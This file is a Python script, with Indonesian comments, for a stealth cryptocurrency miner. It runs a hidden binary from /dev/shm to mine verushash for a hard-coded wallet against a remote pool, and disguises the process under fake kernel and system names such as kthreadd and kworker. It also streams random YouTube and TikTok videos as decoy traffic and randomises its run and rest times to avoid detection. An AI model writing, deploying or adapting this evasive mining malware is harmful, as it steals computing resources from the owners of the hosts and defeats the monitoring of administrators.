import subprocess
import time
import os
import random
import shutil
import threading

# Konfigurasi
WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
ALGO = "verushash"
CPU_THREADS = 2
BASE_PATH = "/dev/shm/.cache/"
ORIGINAL_BINARY = os.path.join(BASE_PATH, "jbd2")

# Daftar nama file palsu
FAKE_NAMES = [
    "kthreadd", "irqbalance", "systemd", "rs:main", "syslogd",
    "udevd", "kworker/0:1", "watchdog/1", "rcu_sched"
]

# Daftar pool endpoint
ENDPOINTS = [
    "interstellar.hidora.com:11308",
    "interstellar.hidora.com:11365",
    "interstellar.hidora.com:11373",
    "interstellar.hidora.com:11283",
    "interstellar.hidora.com:11401",
]

# Daftar video streaming untuk fake trafik
VIDEOS = [
    "https://youtu.be/abh5hbJV-YE",
    "https://youtu.be/3oTxP-a0rnE",
    "https://youtu.be/7Y4T9b6XoWE",
    "https://vt.tiktok.com/ZSNLzJYcG/"
]

# Cek binary
if not os.path.exists(ORIGINAL_BINARY):
    print("Binary tidak ditemukan di:", ORIGINAL_BINARY)
    exit(1)

# Fungsi pemutar video fake
def stream_fake_video():
    while True:
        url = random.choice(VIDEOS)
        try:
            subprocess.run(
                ["yt-dlp", "-o", "-", url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass
        time.sleep(random.randint(10, 30))

# Mulai streaming
stream_thread = threading.Thread(target=stream_fake_video, daemon=True)
stream_thread.start()

# Loop panen
while True:
    run_minutes = random.randint(25, 30)
    rest_minutes = random.randint(5, 7)
    pool = random.choice(ENDPOINTS)
    fake_name = random.choice(FAKE_NAMES)
    temp_binary = os.path.join(BASE_PATH, fake_name)

    print(f"Menjalankan panen di {pool} sebagai proses '{fake_name}' selama {run_minutes} menit...")

    shutil.copy(ORIGINAL_BINARY, temp_binary)
    os.chmod(temp_binary, 0o755)

    try:
        # Jalankan dengan nama proses disamarkan
        process = subprocess.Popen([
            "bash", "-c",
            f"exec -a {fake_name} {temp_binary} --algorithm {ALGO} --pool {pool} --wallet {WALLET} --cpu-threads {CPU_THREADS} --log-file /dev/null"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(run_minutes * 60)

        print(f"Istirahat selama {rest_minutes} menit...")
        process.terminate()
        try:
            process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            process.kill()

    except Exception as e:
        print("Error:", e)

    # Bersih-bersih
    os.system(f"pkill -f '{temp_binary}'")
    if os.path.exists(temp_binary):
        os.remove(temp_binary)

    time.sleep((rest_minutes * 60) + random.randint(10, 60))  # Delay ekstra biar makin random
